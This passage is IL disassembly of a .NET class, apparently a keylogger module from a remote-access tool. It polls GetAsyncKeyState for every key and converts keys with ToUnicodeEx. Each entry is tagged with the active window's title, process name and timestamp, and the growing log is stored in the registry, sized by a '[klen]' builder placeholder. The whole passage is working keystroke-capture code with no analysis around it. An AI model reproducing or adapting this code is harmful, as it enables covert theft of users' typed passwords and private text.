      IL_005e:  ldarg.0
      IL_005f:  ldloc.3
      IL_0060:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0065:  stfld      string j.kl::LastAS
      IL_006a:  ldc.i4.6
      IL_006b:  newarr     [mscorlib]System.String
      IL_0070:  stloc.s    V_6
      IL_0072:  ldloc.s    V_6
      IL_0074:  ldc.i4.0
      IL_0075:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_007a:  stelem.ref
      IL_007b:  ldloc.s    V_6
      IL_007d:  ldc.i4.1
      IL_007e:  call       valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.DateAndTime::get_Now()
      IL_0083:  stloc.s    V_5
      IL_0085:  ldloca.s   V_5
      IL_0087:  ldstr      "yy/MM/dd "
      IL_008c:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0091:  stelem.ref
      IL_0092:  ldloc.s    V_6
      IL_0094:  ldc.i4.2
      IL_0095:  ldloc.3
      IL_0096:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_009b:  stelem.ref
      IL_009c:  ldloc.s    V_6
      IL_009e:  ldc.i4.3
      IL_009f:  ldstr      " "
      IL_00a4:  stelem.ref
      IL_00a5:  ldloc.s    V_6
      IL_00a7:  ldc.i4.4
      IL_00a8:  ldarg.0
      IL_00a9:  ldfld      string j.kl::LastAS
      IL_00ae:  stelem.ref
      IL_00af:  ldloc.s    V_6
      IL_00b1:  ldc.i4.5
      IL_00b2:  ldstr      bytearray (01 00 0D 00 0A 00 ) 
      IL_00b7:  stelem.ref
      IL_00b8:  ldloc.s    V_6
      IL_00ba:  call       string [mscorlib]System.String::Concat(string[])
      IL_00bf:  stloc.0
      IL_00c0:  leave.s    IL_00d7

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00c2:  dup
      IL_00c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c8:  stloc.s    V_4
      IL_00ca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00cf:  leave.s    IL_00d1

    }  // end handler
    IL_00d1:  ldstr      ""
    IL_00d6:  ret

    IL_00d7:  ldloc.0
    IL_00d8:  ret
  } // end of method kl::AV

  .method private static string  VKCodeToUnicode(uint32 a) cil managed
  {
    // Code size       134 (0x86)
    .maxstack  7
    .locals init (string V_0,
             int32 V_1,
             uint8[] V_2,
             bool V_3,
             native int V_4,
             native int V_5,
             uint32 V_6,
             class [mscorlib]System.Text.StringBuilder V_7,
             class [mscorlib]System.Exception V_8,
             int32 V_9)
    .try
    {
      IL_0000:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0005:  stloc.s    V_7
      IL_0007:  ldc.i4     0xff
      IL_000c:  newarr     [mscorlib]System.Byte
      IL_0011:  stloc.2
      IL_0012:  ldloc.2
      IL_0013:  call       bool j.kl::GetKeyboardState(uint8[])
      IL_0018:  stloc.3
      IL_0019:  ldloc.3
      IL_001a:  brtrue.s   IL_0024

      IL_001c:  ldstr      ""
      IL_0021:  stloc.0
      IL_0022:  leave.s    IL_0084

      IL_0024:  ldarg.0
      IL_0025:  ldc.i4.0
      IL_0026:  call       uint32 j.kl::MapVirtualKey(uint32,
                                                                  uint32)
      IL_002b:  stloc.s    V_6
      IL_002d:  call       native int j.OK::GetForegroundWindow()
      IL_0032:  stloc.s    V_4
      IL_0034:  ldloc.s    V_4
      IL_0036:  ldc.i4.0
      IL_0037:  stloc.s    V_9
      IL_0039:  ldloca.s   V_9
      IL_003b:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                            int32&)
      IL_0040:  stloc.1
      IL_0041:  ldloc.1
      IL_0042:  call       int32 j.kl::GetKeyboardLayout(int32)
      IL_0047:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_004c:  stloc.s    V_5
      IL_004e:  ldarg.0
      IL_004f:  ldloc.s    V_6
      IL_0051:  ldloc.2
      IL_0052:  ldloc.s    V_7
      IL_0054:  ldc.i4.5
      IL_0055:  ldc.i4.0
      IL_0056:  ldloc.s    V_5
      IL_0058:  call       int32 j.kl::ToUnicodeEx(uint32,
                                                               uint32,
                                                               uint8[],
                                                               class [mscorlib]System.Text.StringBuilder,
                                                               int32,
                                                               uint32,
                                                               native int)
      IL_005d:  pop
      IL_005e:  ldloc.s    V_7
      IL_0060:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0065:  stloc.0
      IL_0066:  leave.s    IL_0084

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0068:  dup
      IL_0069:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006e:  stloc.s    V_8
      IL_0070:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0075:  leave.s    IL_0077

    }  // end handler
    IL_0077:  ldarg.0
    IL_0078:  conv.ovf.i4.un
    IL_0079:  box        [System.Windows.Forms]System.Windows.Forms.Keys
    IL_007e:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_0083:  ret

    IL_0084:  ldloc.0
    IL_0085:  ret
  } // end of method kl::VKCodeToUnicode

  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       396 (0x18c)
    .maxstack  3
    .locals init (string V_0,
             bool V_1,
             class [mscorlib]System.Exception V_2,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_3,
             char V_4)
    IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_000a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_000f:  stloc.1
    IL_0010:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0015:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_001a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_001f:  brfalse.s  IL_002a

    IL_0021:  ldloc.1
    IL_0022:  brfalse.s  IL_0028

    IL_0024:  ldc.i4.0
    IL_0025:  stloc.1
    IL_0026:  br.s       IL_002a

    IL_0028:  ldc.i4.1
    IL_0029:  stloc.1
    .try
    {
      IL_002a:  ldarg.1
      IL_002b:  stloc.3
      IL_002c:  ldloc.3
      IL_002d:  ldc.i4.s   46
      IL_002f:  beq.s      IL_0035

      IL_0031:  ldloc.3
      IL_0032:  ldc.i4.8
      IL_0033:  bne.un.s   IL_0055

      IL_0035:  ldstr      "["
      IL_003a:  ldarg.1
      IL_003b:  box        [System.Windows.Forms]System.Windows.Forms.Keys
      IL_0040:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_0045:  ldstr      "]"
      IL_004a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_004f:  stloc.0
      IL_0050:  leave      IL_018a

      IL_0055:  ldloc.3
      IL_0056:  ldc.i4     0xa0
      IL_005b:  beq.s      IL_00d8

      IL_005d:  ldloc.3
      IL_005e:  ldc.i4     0xa1
      IL_0063:  beq.s      IL_00d8

      IL_0065:  ldloc.3
      IL_0066:  ldc.i4     0x10000
      IL_006b:  beq.s      IL_00d8

      IL_006d:  ldloc.3
      IL_006e:  ldc.i4.s   16
      IL_0070:  beq.s      IL_00d8

      IL_0072:  ldloc.3
      IL_0073:  ldc.i4     0x20000
      IL_0078:  beq.s      IL_00d8

      IL_007a:  ldloc.3
      IL_007b:  ldc.i4.s   17
      IL_007d:  beq.s      IL_00d8

      IL_007f:  ldloc.3
      IL_0080:  ldc.i4     0xa3
      IL_0085:  beq.s      IL_00d8

      IL_0087:  ldloc.3
      IL_0088:  ldc.i4     0xa2
      IL_008d:  beq.s      IL_00d8

      IL_008f:  ldloc.3
      IL_0090:  ldc.i4     0x40000
      IL_0095:  beq.s      IL_00d8

      IL_0097:  ldloc.3
      IL_0098:  ldc.i4.s   112
      IL_009a:  beq.s      IL_00d8

      IL_009c:  ldloc.3
      IL_009d:  ldc.i4.s   113
      IL_009f:  beq.s      IL_00d8

      IL_00a1:  ldloc.3
      IL_00a2:  ldc.i4.s   114
      IL_00a4:  beq.s      IL_00d8

      IL_00a6:  ldloc.3
      IL_00a7:  ldc.i4.s   115
      IL_00a9:  beq.s      IL_00d8

      IL_00ab:  ldloc.3
      IL_00ac:  ldc.i4.s   116
      IL_00ae:  beq.s      IL_00d8

      IL_00b0:  ldloc.3
      IL_00b1:  ldc.i4.s   117
      IL_00b3:  beq.s      IL_00d8

      IL_00b5:  ldloc.3
      IL_00b6:  ldc.i4.s   118
      IL_00b8:  beq.s      IL_00d8

      IL_00ba:  ldloc.3
      IL_00bb:  ldc.i4.s   119
      IL_00bd:  beq.s      IL_00d8

      IL_00bf:  ldloc.3
      IL_00c0:  ldc.i4.s   120
      IL_00c2:  beq.s      IL_00d8

      IL_00c4:  ldloc.3
      IL_00c5:  ldc.i4.s   121
      IL_00c7:  beq.s      IL_00d8

      IL_00c9:  ldloc.3
      IL_00ca:  ldc.i4.s   122
      IL_00cc:  beq.s      IL_00d8

      IL_00ce:  ldloc.3
      IL_00cf:  ldc.i4.s   123
      IL_00d1:  beq.s      IL_00d8

      IL_00d3:  ldloc.3
      IL_00d4:  ldc.i4.s   35
      IL_00d6:  bne.un.s   IL_00e3

      IL_00d8:  ldstr      ""
      IL_00dd:  stloc.0
      IL_00de:  leave      IL_018a

      IL_00e3:  ldloc.3
      IL_00e4:  ldc.i4.s   32
      IL_00e6:  bne.un.s   IL_00f3

      IL_00e8:  ldstr      " "
      IL_00ed:  stloc.0
      IL_00ee:  leave      IL_018a

      IL_00f3:  ldloc.3
      IL_00f4:  ldc.i4.s   13
      IL_00f6:  beq.s      IL_00fd

      IL_00f8:  ldloc.3
      IL_00f9:  ldc.i4.s   13
      IL_00fb:  bne.un.s   IL_011f

      IL_00fd:  ldarg.0
      IL_00fe:  ldfld      string j.kl::Logs
      IL_0103:  ldstr      "[ENTER]\r\n"
      IL_0108:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_010d:  brfalse.s  IL_0117

      IL_010f:  ldstr      ""
      IL_0114:  stloc.0
      IL_0115:  leave.s    IL_018a

      IL_0117:  ldstr      "[ENTER]\r\n"
      IL_011c:  stloc.0
      IL_011d:  leave.s    IL_018a

      IL_011f:  ldloc.3
      IL_0120:  ldc.i4.s   9
      IL_0122:  bne.un.s   IL_012c

      IL_0124:  ldstr      "[TAP]\r\n"
      IL_0129:  stloc.0
      IL_012a:  leave.s    IL_018a

      IL_012c:  ldloc.1
      IL_012d:  brfalse.s  IL_013e

      IL_012f:  ldarg.1
      IL_0130:  conv.ovf.u4
      IL_0131:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_0136:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_013b:  stloc.0
      IL_013c:  leave.s    IL_018a

      IL_013e:  ldarg.1
      IL_013f:  conv.ovf.u4
      IL_0140:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_0145:  stloc.0
      IL_0146:  leave.s    IL_018a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0148:  dup
      IL_0149:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_014e:  stloc.2
      IL_014f:  ldloc.1
      IL_0150:  brfalse.s  IL_016e

      IL_0152:  ldarg.1
      IL_0153:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_0158:  stloc.s    V_4
      IL_015a:  ldloca.s   V_4
      IL_015c:  call       instance string [mscorlib]System.Char::ToString()
      IL_0161:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0166:  stloc.0
      IL_0167:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_016c:  leave.s    IL_018a

      IL_016e:  ldarg.1
      IL_016f:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_0174:  stloc.s    V_4
      IL_0176:  ldloca.s   V_4
      IL_0178:  call       instance string [mscorlib]System.Char::ToString()
      IL_017d:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_0182:  stloc.0
      IL_0183:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0188:  leave.s    IL_018a

    }  // end handler
    IL_018a:  ldloc.0
    IL_018b:  ret
  } // end of method kl::Fix

  .method public instance void  WRK() cil managed
  {
    // Code size       269 (0x10d)
    .maxstack  5
    .locals init (int32 V_0,
             int32 V_1,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_2,
             string V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5)
    IL_0000:  ldarg.0
    IL_0001:  ldarg.0
    IL_0002:  ldfld      string j.kl::vn
    IL_0007:  ldstr      ""
    IL_000c:  call       object j.OK::GTV(string,
                                                      object)
    IL_0011:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0016:  stfld      string j.kl::Logs
    .try
    {
      IL_001b:  ldc.i4.0
      IL_001c:  stloc.0
      IL_001d:  ldloc.0
      IL_001e:  ldc.i4.1
      IL_001f:  add.ovf
      IL_0020:  stloc.0
      IL_0021:  ldc.i4.0
      IL_0022:  stloc.1
      IL_0023:  ldloc.1
      IL_0024:  call       int16 j.kl::GetAsyncKeyState(int32)
      IL_0029:  ldc.i4     0xffff8001
      IL_002e:  ceq
      IL_0030:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0035:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
      IL_003a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
      IL_003f:  ldc.i4.0
      IL_0040:  ceq
      IL_0042:  and
      IL_0043:  brfalse.s  IL_0088

      IL_0045:  ldloc.1
      IL_0046:  stloc.2
      IL_0047:  ldarg.0
      IL_0048:  ldloc.2
      IL_0049:  callvirt   instance string j.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_004e:  stloc.3
      IL_004f:  ldloc.3
      IL_0050:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0055:  ldc.i4.0
      IL_0056:  ble.s      IL_0081

      IL_0058:  ldarg.0
      IL_0059:  ldarg.0
      IL_005a:  ldfld      string j.kl::Logs
      IL_005f:  ldarg.0
      IL_0060:  callvirt   instance string j.kl::AV()
      IL_0065:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_006a:  stfld      string j.kl::Logs
      IL_006f:  ldarg.0
      IL_0070:  ldarg.0
      IL_0071:  ldfld      string j.kl::Logs
      IL_0076:  ldloc.3
      IL_0077:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_007c:  stfld      string j.kl::Logs
      IL_0081:  ldarg.0
      IL_0082:  ldloc.2
      IL_0083:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
      IL_0088:  ldloc.1
      IL_0089:  ldc.i4.1
      IL_008a:  add.ovf
      IL_008b:  stloc.1
      IL_008c:  ldloc.1
      IL_008d:  ldc.i4     0xff
      IL_0092:  ble.s      IL_0023

      IL_0094:  ldloc.0
      IL_0095:  ldc.i4     0x3e8
      IL_009a:  bne.un.s   IL_00f2

      IL_009c:  ldc.i4.0
      IL_009d:  stloc.0
      IL_009e:  ldstr      "[klen]"
      IL_00a3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00a8:  ldc.i4     0x400
      IL_00ad:  mul.ovf
      IL_00ae:  stloc.s    V_4
      IL_00b0:  ldarg.0
      IL_00b1:  ldfld      string j.kl::Logs
      IL_00b6:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00bb:  ldloc.s    V_4
      IL_00bd:  ble.s      IL_00df

      IL_00bf:  ldarg.0
      IL_00c0:  ldarg.0
      IL_00c1:  ldfld      string j.kl::Logs
      IL_00c6:  ldc.i4.0
      IL_00c7:  ldarg.0
      IL_00c8:  ldfld      string j.kl::Logs
      IL_00cd:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00d2:  ldloc.s    V_4
      IL_00d4:  sub.ovf
      IL_00d5:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_00da:  stfld      string j.kl::Logs
      IL_00df:  ldarg.0
      IL_00e0:  ldfld      string j.kl::vn
      IL_00e5:  ldarg.0
      IL_00e6:  ldfld      string j.kl::Logs
      IL_00eb:  ldc.i4.1
      IL_00ec:  call       bool j.OK::STV(string,
                                                      object,
                                                      valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00f1:  pop
      IL_00f2:  ldc.i4.1
      IL_00f3:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00f8:  br         IL_001d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00fd:  dup
      IL_00fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0103:  stloc.s    V_5
      IL_0105:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010a:  leave.s    IL_010c

    }  // end handler
    IL_010c:  ret
  } // end of method kl::WRK

} // end of class j.kl
